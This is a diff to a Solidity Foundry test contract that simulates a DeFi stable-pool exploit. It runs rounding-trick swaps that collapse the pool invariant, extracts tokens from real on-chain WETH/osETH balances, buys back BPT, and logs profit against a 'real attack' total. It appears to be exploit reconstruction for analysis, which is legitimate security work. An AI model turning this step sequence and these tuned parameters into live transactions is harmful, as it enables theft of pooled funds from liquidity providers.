@@ -87,18 +87,21 @@ contract SearchParams is Test {
     /// Returns (swapOut3, newBalWETH, newBalOSETH). Reverts if all 3 attempts fail.
     function _computeSwap3(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256) {
         uint256 swapOut3 = _truncateToTop2Digits(balWETH);
+        //uint256 swapOut3 = balWETH * 999 / 1000;
 
         // Attempt 1: truncated amount
         try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
             return (swapOut3, w, o);
         } catch {}
 
+        //console.log("Attempt 2: 9/10 fallback");
         // Attempt 2: 9/10 fallback
         swapOut3 = swapOut3 * 9 / 10;
         try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
             return (swapOut3, w, o);
         } catch {}
 
+        //console.log("Attempt 3: 9/10 of 9/10 fallback");
         // Attempt 3: 9/10 of 9/10 fallback
         swapOut3 = swapOut3 * 9 / 10;
         try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
@@ -137,6 +140,122 @@ contract SearchParams is Test {
         try this._computeSwap3(tempBal[0], tempBal[1]) returns (uint256 swapOut3, uint256 w, uint256 o) {
             return (w, o);
         } catch {revert("Swap 3 failed");}
+    }
+
+    /// @notice Swap 3 using 999/1000 method instead of truncation
+    function _computeSwap3_999(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256) {
+        uint256 swapOut3 = balWETH * 999 / 1000;
+
+        // Attempt 1
+        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
+            return (swapOut3, w, o);
+        } catch {}
+
+        // Attempt 2: 9/10 fallback
+        swapOut3 = swapOut3 * 9 / 10;
+        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
+            return (swapOut3, w, o);
+        } catch {}
+
+        // Attempt 3: 9/10 of 9/10 fallback
+        swapOut3 = swapOut3 * 9 / 10;
+        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
+            return (swapOut3, w, o);
+        } catch {}
+
+        revert("Swap 3 (999) failed after 3 attempts");
+    }
+
+    /// @notice Simulate one round using 999/1000 method for Swap 3
+    function simulateOneRound_999(
+        uint256 balWETH,
+        uint256 balOSETH,
+        uint256 trickAmt
+    ) external returns (uint256 newBalWETH, uint256 newBalOSETH) {
+        uint256[] memory currentBal = new uint256[](2);
+        uint256[] memory tempBal;
+        uint256[] memory scalingFactors = new uint256[](2);
+
+        currentBal[0] = balWETH;
+        currentBal[1] = balOSETH;
+        scalingFactors[0] = sf[0];
+        scalingFactors[1] = sf[1];
+        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
+        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);
+
+        scalingFactors[0] = sf[0];
+        scalingFactors[1] = sf[1];
+        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);
+
+        try this._computeSwap3_999(tempBal[0], tempBal[1]) returns (uint256, uint256 w, uint256 o) {
+            return (w, o);
+        } catch { revert("Swap 3 (999) failed"); }
+    }
+
+    /// @notice Compare truncation vs 999/1000 for Swap 3 extraction
+    function test_compareSwap3Methods() public {
+        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
+        uint256 N = 30;
+        uint256 remain = 67000;
+
+        console.log("=== COMPARE SWAP 3 METHODS: truncation vs 999/1000 ===");
+        console.log("remain:", remain, "N:", N);
+
+        // --- Method 1: Truncation (real attacker) ---
+        uint256 bW1 = remain; uint256 bO1 = remain;
+        uint256 d_initial = _getInvariant(bW1, bO1);
+        console.log("D_initial:", d_initial);
+
+        console.log("--- Truncation method (per-round) ---");
+        for (uint256 r = 0; r < N; r++) {
+            (bW1, bO1) = this.simulateOneRound(bW1, bO1, trickAmt);
+            if (r < 5 || r >= N - 3) {
+                console.log("Round:", r);
+                console.log("WETH:", bW1);
+                console.log("osETH:", bO1);
+                console.log("    D=", _getInvariant(bW1, bO1));
+            }
+        }
+        uint256 d_trunc = _getInvariant(bW1, bO1);
+        console.log("Truncation final: WETH=", bW1, "osETH=", bO1);
+        console.log("D=", d_trunc);
+
+        // --- Method 2: 999/1000 ---
+        uint256 bW2 = remain; uint256 bO2 = remain;
+
+        console.log("--- 999/1000 method (per-round) ---");
+        uint256 roundsOk = 0;
+        for (uint256 r = 0; r < N; r++) {
+            try this.simulateOneRound_999(bW2, bO2, trickAmt) returns (uint256 w, uint256 o) {
+                bW2 = w; bO2 = o;
+                roundsOk++;
+                if (r < 5 || r >= N - 3) {
+                    console.log("Round:", r);
+                    console.log("WETH:", bW2);
+                    console.log("osETH:", bO2);
+                    console.log("    D=", _getInvariant(bW2, bO2));
+                }
+            } catch {
+                console.log("  Round", r, ": REVERTED");
+                break;
+            }
+        }
+        uint256 d_999 = _getInvariant(bW2, bO2);
+        console.log("999/1000 final: WETH=", bW2, "osETH=", bO2);
+        console.log("D=", d_999);
+        console.log("999/1000 rounds completed:", roundsOk);
+
+        // --- Summary ---
+        console.log("=== SUMMARY ===");
+        console.log("D_initial:", d_initial);
+        console.log("D_trunc:", d_trunc, "deflation_bps:", (d_initial - d_trunc) * 10000 / d_initial);
+        if (roundsOk > 0) {
+            console.log("D_999:", d_999, "deflation_bps:", (d_initial - d_999) * 10000 / d_initial);
+        }
+        uint256 cost_trunc = 2 * remain - (bW1 + bO1);
+        uint256 cost_999 = 2 * remain - (bW2 + bO2);
+        console.log("Cycling cost (truncation):", cost_trunc);
+        console.log("Cycling cost (999/1000):", cost_999);
     }
 
     /// @notice Derive trickAmt analytically: trickAmt = floor(1e18 / (sf - 1e18))
@@ -1138,6 +1257,149 @@ contract SearchParams is Test {
                 break;
             }
         }
+    }
+
+    // ─── Detailed per-token breakdown ───────────────────────────────────
+
+    function _simulateStep1ExtractionDetailed(
+        uint256 realWETH,
+        uint256 realOSETH,
+        uint256 targetRemain,
+        uint256 bptSupply
+    ) internal view returns (uint256 totalWethOut, uint256 totalOsethOut, uint256 totalBptSold, uint256 remainingSupply) {
+        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(realWETH, targetRemain, 15);
+        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(realOSETH, targetRemain, 15);
+
+        uint256 bW = realWETH;
+        uint256 bO = realOSETH;
+        uint256 supply = bptSupply;
+
+        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
+        for (uint256 i = 0; i < maxSwaps; i++) {
+            if (i < wethCount) {
+                uint256 preInvariant = _getInvariant(bW, bO);
+                uint256 preSupply = supply;
+                uint256 tokenOut = wethAmounts[i];
+                uint256[] memory bal = new uint256[](2);
+                uint256[] memory scalingFactors = new uint256[](2);
+                bal[0] = bW; bal[1] = bO;
+                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
+                uint256 bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, 0, tokenOut, supply, amp, swapFeePercentage);
+                bW -= tokenOut;
+                supply -= bptIn;
+                totalBptSold += bptIn;
+                totalWethOut += tokenOut;
+                supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+            }
+            if (i < osethCount) {
+                uint256 preInvariant = _getInvariant(bW, bO);
+                uint256 preSupply = supply;
+                uint256 tokenOut = osethAmounts[i];
+                uint256[] memory bal = new uint256[](2);
+                uint256[] memory scalingFactors = new uint256[](2);
+                bal[0] = bW; bal[1] = bO;
+                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
+                uint256 bptIn = swapMath.getBptInForTokenOut(bal, scalingFactors, 1, tokenOut, supply, amp, swapFeePercentage);
+                bO -= tokenOut;
+                supply -= bptIn;
+                totalBptSold += bptIn;
+                totalOsethOut += tokenOut;
+                supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+            }
+        }
+        remainingSupply = supply;
+    }
+
+    function _simulateStep3RepaymentDetailed(
+        uint256 balWETH,
+        uint256 balOSETH,
+        uint256 bptToBuy,
+        uint256 virtualSupply
+    ) internal view returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
+        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);
+
+        uint256 bW = balWETH;
+        uint256 bO = balOSETH;
+        uint256 supply = virtualSupply;
+
+        for (uint256 i = 0; i < swapCount; i++) {
+            totalBptBought += bptAmounts[i];
+            uint256 preInvariant = _getInvariant(bW, bO);
+            uint256 preSupply = supply;
+            uint256[] memory bal = new uint256[](2);
+            uint256[] memory scalingFactors = new uint256[](2);
+            bal[0] = bW; bal[1] = bO;
+            scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
+            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
+            uint256 amountIn = swapMath.getTokenInForBptOut(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
+            if (tokenIndex == 0) { bW += amountIn; wethCost += amountIn; }
+            else { bO += amountIn; osethCost += amountIn; }
+            supply += bptAmounts[i];
+            supply += _calcProtocolFeeBpt(preInvariant, preSupply, bW, bO, supply);
+        }
+    }
+
+    function test_detailedTokenBreakdown() public {
+        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
+        bytes32 poolId = OSETH_BPT.getPoolId();
+        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
+        uint256 realWETH = realBal[0];
+        uint256 realOSETH = realBal[2];
+        uint256 totalSupplyBPT = IERC20(address(OSETH_BPT)).totalSupply();
+        uint256 registeredBpt = realBal[1];
+        uint256 totalBPT = totalSupplyBPT - registeredBpt;
+
+        uint256 remain = 67000;
+        uint256 N = 30;
+
+        console.log("=== DETAILED TOKEN BREAKDOWN: remain=67000, N=30 ===");
+
+        // Step 1: extract tokens (per-token)
+        (uint256 wethOut, uint256 osethOut, uint256 bptSold, uint256 postStep1Supply) =
+            _simulateStep1ExtractionDetailed(realWETH, realOSETH, remain, totalBPT);
+        console.log("--- Step 1: Token Extraction ---");
+        console.log("WETH extracted:", wethOut);
+        console.log("osETH extracted:", osethOut);
+        console.log("BPT sold:", bptSold);
+
+        // Step 2: D-collapse cycling (per-token costs)
+        uint256 bW = remain; uint256 bO = remain;
+        for (uint256 r = 0; r < N; r++) {
+            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
+        }
+        uint256 wethCostStep2 = remain - bW;
+        uint256 osethCostStep2 = remain - bO;
+        console.log("--- Step 2: D-Collapse Cycling ---");
+        console.log("WETH consumed:", wethCostStep2);
+        console.log("osETH consumed:", osethCostStep2);
+
+        // Step 3: BPT buyback (per-token costs)
+        uint256 bptTarget = totalBPT * 10030 / 10000;
+        (uint256 wethCostStep3, uint256 osethCostStep3, uint256 bptBought) =
+            _simulateStep3RepaymentDetailed(bW, bO, bptTarget, postStep1Supply);
+        console.log("--- Step 3: BPT Buyback ---");
+        console.log("WETH spent on buyback:", wethCostStep3);
+        console.log("osETH spent on buyback:", osethCostStep3);
+        console.log("BPT bought back:", bptBought);
+
+        // Net token deltas
+        uint256 netWeth = wethOut - wethCostStep2 - wethCostStep3;
+        uint256 netOseth = osethOut - osethCostStep2 - osethCostStep3;
+        uint256 netBpt = bptBought - bptSold;
+
+        console.log("=== NET TOKEN DELTAS ===");
+        console.log("Net WETH (wei):", netWeth);
+        console.log("Net WETH (ETH):", netWeth / 1e18);
+        console.log("Net osETH (wei):", netOseth);
+        console.log("Net osETH (ETH):", netOseth / 1e18);
+        console.log("Net BPT (wei):", netBpt);
+        console.log("Net BPT (ETH):", netBpt / 1e18);
+        console.log("Total profit (ETH):", (netWeth + netOseth) / 1e18);
+
+        console.log("=== REAL ATTACK COMPARISON ===");
+        console.log("Real WETH:  6587.44 ETH");
+        console.log("Real osETH: 6851.12 ETH");
+        console.log("Real BPT:   44.15 ETH");
     }
 }
 
